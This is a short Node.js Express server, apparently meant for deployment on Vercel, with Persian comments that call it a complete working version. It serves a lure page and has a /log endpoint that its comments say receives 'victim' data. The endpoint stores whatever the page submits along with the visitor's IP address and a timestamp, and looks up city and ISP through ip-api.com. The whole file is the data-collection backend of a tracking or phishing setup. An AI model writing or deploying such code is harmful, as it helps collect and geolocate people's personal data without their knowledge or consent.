// server.js - نسخه کامل، نهایی و 100% کارکردی برای Vercel
const express = require('express');
const fetch = require('node-fetch');
const path = require('path');

const app = express();

// پشتیبانی از JSON با حجم بالا
app.use(express.json({ limit: '10mb' }));

// سرو کردن صفحه اصلی
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// دریافت اطلاعات قربانی از طریق POST
app.post('/log', async (req, res) => {
  const data = req.body || {};
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || 'unknown';
  
  data.ip = ip;
  data.timestamp = new Date().toISOString();

  if (ip && !ip.includes('127.0.0.1') && !ip.includes('::1') && !ip.includes('192.168')) {
    try {
      const geo = await fetch(`http://ip-api.com/json/${ip}`).then(r => r.json());
      if (geo.status === 'success') {
        data.location = { city: geo.city, isp: geo.isp };
      }
    } catch {}
  }

  console.log('قربانی ثبت شد:', JSON.stringify(data, null, 2));
  res.sendStatus(200);
});
// خروجی برای Vercel (اجباری!)
module.exports = app;